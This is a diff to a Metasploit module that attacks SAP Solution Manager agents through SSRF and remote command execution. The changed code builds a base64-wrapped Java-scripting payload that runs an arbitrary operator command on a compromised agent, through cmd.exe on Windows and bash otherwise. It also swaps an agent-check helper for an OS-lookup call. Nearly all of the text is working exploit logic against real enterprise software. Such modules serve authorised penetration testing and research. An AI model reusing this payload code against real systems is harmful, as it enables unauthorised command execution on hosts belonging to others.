@@ -76,12 +76,7 @@ class MetasploitModule < Msf::Auxiliary
     @ssrf_method = datastore['SSRF_METHOD']
     @ssrf_uri = datastore['SSRF_URI']
     @ssrf_payload = make_ssrf_payload(@ssrf_method, @ssrf_uri)
-
     @rce_command = datastore['COMMAND']
-    command = "var d = Packages.java.util.Base64.getDecoder().decode('#{Rex::Text.encode_base64(@rce_command)}');"
-    command << 'var c = new Packages.java.lang.String(d);'
-    command << 'Packages.java.lang.Runtime.getRuntime().exec(c).waitFor();'
-    @rce_payload = make_rce_payload(command)
   end
 
   # Report Service and Vulnerability
@@ -99,23 +94,6 @@ class MetasploitModule < Msf::Auxiliary
       name: name,
       refs: references
     )
-  end
-
-  # Check current agent in agents list
-  def check_agent(agent_name)
-    vprint_status('Getting a list of connected agents ...')
-    agents = make_agents_array
-    if agents.empty?
-      fail_with(Failure::NoTarget, "Solution Manager server: #{@host}:#{@port} is vulnerable but no agents are connected!")
-    elsif agent_name.nil?
-      fail_with(Failure::NoTarget, "Please set agent: `set AGENT #{agents[0]['serverName']}`")
-    end
-    agents.each do |agent|
-      if agent_name == agent[:serverName]
-        return true
-      end
-    end
-    fail_with(Failure::NotFound, "Not found agent: #{agent_name} in connected agents: \n#{pretty_agents_table(agents)}")
   end
 
   def run
@@ -147,7 +125,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def action_ssrf
     setup_xml_and_variables
-    check_agent(@agent_name)
+    get_agent_os(@agent_name)
 
     print_status("Enable EEM on agent: #{@agent_name}")
     enable_eem(@agent_name)
@@ -167,7 +145,17 @@ class MetasploitModule < Msf::Auxiliary
 
   def action_exec
     setup_xml_and_variables
-    check_agent(@agent_name)
+    command = "var d = Packages.java.util.Base64.getDecoder().decode('#{Rex::Text.encode_base64(@rce_command)}');"
+    command << 'var c = new Packages.java.lang.String(d);'
+    command << 'var b = new Packages.java.lang.ProcessBuilder();'
+    agent_os = get_agent_os(@agent_name) || 'Unknown OS'
+    case agent_os
+    when /windows/i
+      command << 'b.command("cmd.exe","/c",c).start().waitFor();'
+    else
+      command << 'b.command("bash","-c",c).start().waitFor();'
+    end
+    @rce_payload = make_rce_payload(command)
 
     print_status("Enable EEM on agent: #{@agent_name}")
     enable_eem(@agent_name)
